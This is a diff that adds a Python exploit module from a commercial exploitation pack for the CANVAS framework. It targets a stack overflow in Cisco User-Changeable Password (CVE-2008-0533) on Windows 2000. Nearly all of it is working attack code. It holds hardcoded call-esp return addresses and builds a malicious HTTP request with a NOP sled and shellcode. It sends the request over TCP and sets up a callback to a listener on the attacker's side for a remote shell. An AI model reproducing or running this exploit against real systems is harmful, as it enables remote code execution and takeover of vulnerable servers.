@@ -1,0 +1,135 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+
+import sys
+import random
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+import struct
+import canvasengine
+
+# GUI info
+NAME = "Cisco User-Changeable Password (UCP) Stack Overflow"
+
+DESCRIPTION = "Stack overflow vulnerability in Cisco User Changeable Password (UCP)"
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "2008.03.12"
+DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/28222"
+DOCUMENTATION["Versions Affected"] = "Cisco UCP < 4.2"
+DOCUMENTATION["CVE Name"] = "CVE-2008-0533"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0533"
+
+VERSION = "0.1"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2000" ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0 : [ "Windows 2000 SP4 French", 0x7846f055 ], # call esp @ ntdll.dll
+    1 : [ "Windows 2000 SP4 English", 0x77f8f055 ], # call esp @ ntdll.dll
+}
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        self.setInfo(DESCRIPTION)
+        self.name = NAME       
+        self.port = 80
+        self.ssl = 0
+        self.version = 1
+        self.searchbadstring = "\x00\x0a\x0d\x20\x25=&"
+        self.badstring = self.searchbadstring
+        return
+
+    def neededListenerTypes(self):
+        from canvasengine import WIN32MOSDEF
+        return [WIN32MOSDEF]    
+
+    def createShellcode(self):
+        if self.callback:
+            host = self.callback.ip
+            port = self.callback.port       
+            
+        self.createWin32SearchShellcode(host, port)
+
+    def run(self):
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))        
+        self.ssl = int(self.argsDict.get('ssl', self.ssl))
+        
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+        self.log("Version %d "%(self.version))     
+        self.log("Attacking %s:%d"%(self.host, self.port))
+        
+        sploitstring = self.makesploit()
+                
+        s = self.gettcpsock()
+        s.connect((self.host, self.port))
+                       
+        self.websend(s, sploitstring)                
+
+        if self.ISucceeded():
+            self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port), showlog=True)
+            self.log("%s done (succeeded!)" % self.name)
+            return 1
+        
+        return 0    
+        
+    def makesploit(self):
+        """
+        Construct the attack        			  
+				
+	"""        		
+							
+	os_name, call_esp = targets[self.version]
+
+	ret = struct.pack('<L', call_esp)
+	
+	data_1 = "GET /securecgi-bin/CSUserCGI.exe?Logout+"
+	data_2 = "\x90" * 95
+	data_3 = self.encodedsearchcode + ".xyzab.c.hacker.\r\nUser-Agent:" + self.shellcode + "\r\nHost: 192.168.133.129\r\n\r\n"
+	
+	sploitstring = data_1 + data_2 + ret + data_3
+	
+        return sploitstring
+        		
+    def displayVersions(self):
+        i = 0
+        print 'Available versions:'
+        for listline in targets.values():
+            print "\t%d: %s" % (i,listline[0])
+            i += 1
+
+    def usage(self):
+        print "Usage: %s -v version -t targethost -p port -l localip -d localport [-O ssl:0|1]\n" % (sys.argv[0])
+        self.displayVersions()
+        sys.exit(0)
+
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
